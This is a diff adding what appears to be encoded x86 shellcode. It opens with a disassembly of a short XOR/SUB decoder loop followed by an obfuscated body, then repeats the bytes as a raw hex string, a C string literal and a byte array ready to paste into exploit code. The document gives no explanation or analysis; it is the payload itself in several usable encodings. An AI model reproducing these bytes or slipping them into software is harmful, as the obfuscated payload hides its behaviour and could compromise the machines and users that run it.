@@ -1,0 +1,57 @@
+0x0        push 0x1f                           \x6a\x1f                  j.        
+0x2        pop ebx                             \x5b                      [         
+0x3        xor word ptr [edi + ecx + 1], bx    \x66\x31\x5c\x0f\x01      f1\..     
+0x8        mov ebx, 0xa1                       \xbb\xa1\x00\x00\x00      .....     
+0xd        sub word ptr [edi + ecx + 1], bx    \x66\x29\x5c\x0f\x01      f)\..     
+0x12       inc ecx                             \x41                      A         
+0x13       loop 0                              \xe2\xeb                  ..        
+0x15       int1                                \xf1                      .         
+0x16       push eax                            \x50                      P         
+0x17       jo 7                                \x70\xee                  p.        
+
+0x19       and cl, byte ptr [ebx]              \x22\x0b                  ".        
+0x1b       nop                                 \x90                      .         
+0x1c       or edx, eax                         \x0b\xd0                  ..        
+0x1e       mov cl, byte ptr [ebx]              \x8a\x0b                  ..        
+0x20       rcr byte ptr [edx + 0xb86c00b], 1   \xd0\x9a\x0b\xc0\x86\x0b  ......    
+0x26       xor byte ptr [esi + 0x3c3e900b], bl \x30\x9e\x0b\x90\x3e\x3c  0...><    
+0x2c       mov dh, bl                          \x8a\xf3                  ..        
+0x2e       xor eax, 0x834709b0                 \x35\xb0\x09\x47\x83      5..G.     
+0x33       cli                                 \x36\xfa                  6.        
+0x35       or edx, edi                         \x0b\xd7                  ..        
+0x37       add dword ptr ss:[eax + 0xb], 0x47819e38 \x36\x81\x40\x0b\x38\x9e\x81\x476.@.8..G  
+0x3f       int1                                \xf1                      .         
+0x40       lodsd eax, dword ptr [esi]          \xad                      .         
+0x41       or esi, edx                         \x0b\xf2                  ..        
+0x43       outsd dx, dword ptr [esi]           \x6f                      o         
+0x44       add dword ptr [ebp + eax*8 + 1], 0x3221c4fc \x81\x44\xc5\x01\xfc\xc4\x21\x32.D....!2  
+0x4c       and dword ptr [0x863c01b0], esi     \x21\x35\xb0\x01\x3c\x86  !5..<.    
+0x52       lds esi, ptr [esi]                  \xc5\x36                  .6        
+	 label_0x54:
+0x54       sub dword ptr [edx], esi            \x29\x32                  )2        
+0x56       xor eax, 0xe2380ba9                 \x35\xa9\x0b\x38\xe2      5..8.     
+0x5b       add dword ptr [edi + 0x24], 0xb2fea0b \x81\x47\x24\x0b\xea\x2f\x0b.G$../.   
+0x62       cmp byte ptr [edx + 0x3a0b4781], bl \x38\x9a\x81\x47\x0b\x3a  8..G.:    
+0x68       outsd dx, dword ptr [esi]           \x6f                      o         
+0x69       mov edx, 0xce264781                 \xba\x81\x47\x26\xce      ..G&.     
+0x6e       db 0xe1 (!)                        \xe1                      .         
+0x6f       db 0x9e (!)                        \x9e                      .         
+0x70       and dword ptr [esi], 0xcfc89e36     \x81\x26\x36\x9e\xc8\xcf  .&6...    
+0x76       leave                               \x26\xc9                  &.        
+0x78       and ebp, dword ptr [edi]            \x23\x2f                  #/        
+0x7a       les ecx, ptr [ecx]                  \xc4\x09                  ..        
+0x7c       mov eax, dword ptr [0xf18bc9bc]     \xa1\xbc\xc9\x8b\xf1      .....     
+0x81       jle 0x54                            \x7e\xd1                  ~.        
+
+0x83       into                                \xce                      .         
+0x84       db 0xbf                             \xbf                      .         
+0x85       push edi                            \x57                      W         
+
+Raw Hex:
+"6a1f5b66315c0f01bba100000066295c0f0141e2ebf15070ee220b900bd08a0bd09a0bc0860b309e0b903e3c8af335b009478336fa0bd73681400b389e8147f1ad0bf26f8144c501fcc421322135b0013c86c536293235a90b38e28147240bea2f0b389a81470b3a6fba814726cee19e8126369ec8cf26c9232fc409a1bcc98bf17ed1cebf57"
+
+String Literal:
+"\x6a\x1f\x5b\x66\x31\x5c\x0f\x01\xbb\xa1\x00\x00\x00\x66\x29\x5c\x0f\x01\x41\xe2\xeb\xf1\x50\x70\xee\x22\x0b\x90\x0b\xd0\x8a\x0b\xd0\x9a\x0b\xc0\x86\x0b\x30\x9e\x0b\x90\x3e\x3c\x8a\xf3\x35\xb0\x09\x47\x83\x36\xfa\x0b\xd7\x36\x81\x40\x0b\x38\x9e\x81\x47\xf1\xad\x0b\xf2\x6f\x81\x44\xc5\x01\xfc\xc4\x21\x32\x21\x35\xb0\x01\x3c\x86\xc5\x36\x29\x32\x35\xa9\x0b\x38\xe2\x81\x47\x24\x0b\xea\x2f\x0b\x38\x9a\x81\x47\x0b\x3a\x6f\xba\x81\x47\x26\xce\xe1\x9e\x81\x26\x36\x9e\xc8\xcf\x26\xc9\x23\x2f\xc4\x09\xa1\xbc\xc9\x8b\xf1\x7e\xd1\xce\xbf\x57"
+
+Array Literal:
+{0x6a, 0x1f, 0x5b, 0x66, 0x31, 0x5c, 0x0f, 0x01, 0xbb, 0xa1, 0x00, 0x00, 0x00, 0x66, 0x29, 0x5c, 0x0f, 0x01, 0x41, 0xe2, 0xeb, 0xf1, 0x50, 0x70, 0xee, 0x22, 0x0b, 0x90, 0x0b, 0xd0, 0x8a, 0x0b, 0xd0, 0x9a, 0x0b, 0xc0, 0x86, 0x0b, 0x30, 0x9e, 0x0b, 0x90, 0x3e, 0x3c, 0x8a, 0xf3, 0x35, 0xb0, 0x09, 0x47, 0x83, 0x36, 0xfa, 0x0b, 0xd7, 0x36, 0x81, 0x40, 0x0b, 0x38, 0x9e, 0x81, 0x47, 0xf1, 0xad, 0x0b, 0xf2, 0x6f, 0x81, 0x44, 0xc5, 0x01, 0xfc, 0xc4, 0x21, 0x32, 0x21, 0x35, 0xb0, 0x01, 0x3c, 0x86, 0xc5, 0x36, 0x29, 0x32, 0x35, 0xa9, 0x0b, 0x38, 0xe2, 0x81, 0x47, 0x24, 0x0b, 0xea, 0x2f, 0x0b, 0x38, 0x9a, 0x81, 0x47, 0x0b, 0x3a, 0x6f, 0xba, 0x81, 0x47, 0x26, 0xce, 0xe1, 0x9e, 0x81, 0x26, 0x36, 0x9e, 0xc8, 0xcf, 0x26, 0xc9, 0x23, 0x2f, 0xc4, 0x09, 0xa1, 0xbc, 0xc9, 0x8b, 0xf1, 0x7e, 0xd1, 0xce, 0xbf, 0x57}
